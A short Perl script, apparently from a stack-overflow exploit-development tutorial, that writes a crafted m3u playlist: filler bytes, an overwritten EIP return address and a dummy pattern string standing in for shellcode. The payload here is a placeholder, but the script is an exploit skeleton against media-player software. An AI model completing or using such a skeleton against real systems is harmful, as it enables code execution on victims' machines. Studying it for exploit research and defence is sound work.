#!/usr/bin/env perl

my $file= "test1.m3u";
my $junk= "A" x 26097;
my $eip = pack('V', 0x000ff690);
print $eip;
my $pre_shellcode = "XXXX";
my $shellcode = "1ABCDEFGHIJK2ABCDEFGHIJK3ABCDEFGHIJK4ABCDEFGHIJK" .
"5ABCDEFGHIJK6ABCDEFGHIJK" .
"7ABCDEFGHIJK8ABCDEFGHIJK" .
"9ABCDEFGHIJKAABCDEFGHIJK".
"BABCDEFGHIJKCABCDEFGHIJK";
open($FILE,">$file");
print $FILE $junk.$eip.$pre_shellcode.$shellcode;
close($FILE);
print "m3u File Created successfully\n";
